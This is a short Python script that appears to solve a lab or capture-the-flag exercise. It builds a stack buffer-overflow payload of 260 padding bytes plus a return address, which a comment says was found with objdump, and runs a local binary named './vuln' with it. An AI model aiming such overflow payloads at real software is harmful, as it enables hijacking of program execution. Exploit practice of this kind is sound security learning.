import sys
import subprocess

add = "\x04\x05\x01" #used objdump to find out the address
payload = 260 * "a" + add

subprocess.run(["./vuln", payload])